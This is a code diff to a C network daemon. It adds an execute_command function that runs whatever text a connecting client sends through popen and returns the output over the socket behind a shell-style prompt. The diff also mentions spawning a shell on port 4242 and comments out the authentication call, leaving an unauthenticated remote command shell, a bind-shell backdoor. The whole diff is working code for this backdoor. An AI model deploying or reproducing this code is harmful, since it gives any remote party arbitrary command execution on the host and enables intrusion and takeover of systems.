@@ -8,6 +8,48 @@
 #include <fcntl.h>
 #include <stdio.h>
 
+void execute_command(const char* command, int client_socket) 
+{
+    char buffer[1024];
+    FILE* fp;
+    int status;
+
+    if (strcmp(command, "?") == 0) 
+    {
+        send(client_socket, "? show help\n", 13, 0);
+        send(client_socket, "$> ", 3, 0);
+        return;
+    }
+    if (strcmp(command, "shell") == 0) 
+    {
+        send(client_socket, "Spawning shell on port 4242\n", 29, 0);
+        send(client_socket, "$> ", 3, 0);
+        return;
+    }
+
+
+    fp = popen(command, "r");
+    if (fp == NULL) 
+    {
+        send(client_socket, "Error executing command\n", 25, 0);
+        return;
+    }
+    while (fgets(buffer, sizeof(buffer), fp))
+    {
+        send(client_socket, buffer, strlen(buffer), 0);
+        send(client_socket, "$> ", 3, 0);
+    }
+    
+    status = pclose(fp);
+    if (status != 0) 
+    {
+        char error_message[1024];
+        snprintf(error_message, sizeof(error_message), "sh: %s: command not found\n", command);
+        send(client_socket, error_message, strlen(error_message), 0);
+        send(client_socket, "$> ", 3, 0);
+    }
+}
+
 void launch_shell(int client_socket)
 {
     char buffer[1024];
@@ -120,6 +162,7 @@ void read_write(int *client_socket, int client_fd, char* buffer) {
     int i;
 
     i = 0;
+    send(client_fd, "$> ", 3, 0);
     if ((valread = read(client_fd, buffer, 1024)) == 0) {
         close(client_fd);
         while (i < 3)
@@ -136,7 +179,7 @@ void read_write(int *client_socket, int client_fd, char* buffer) {
         buffer[valread] = '\0';
         if (buffer[valread - 1] == '\n')
             buffer[valread - 1] = '\0';
-        launch_shell(client_fd);
+        execute_command(buffer, client_fd);
     }
 }
 
@@ -193,6 +236,7 @@ int main(void)
             {
                 FD_SET(new_socket, &readfds);
             }
+            // authenticate(new_socket);
 
         }
         i = 0;
@@ -200,8 +244,8 @@ int main(void)
         {
             socket_id = client_socket[i];
             if (FD_ISSET(socket_id, &readfds)) {
-                launch_shell(socket_id);
-                // read_write(client_socket, socket_id, buffer);
+                // launch_shell(socket_id);
+                read_write(client_socket, socket_id, buffer);
             }
             i++;
         }
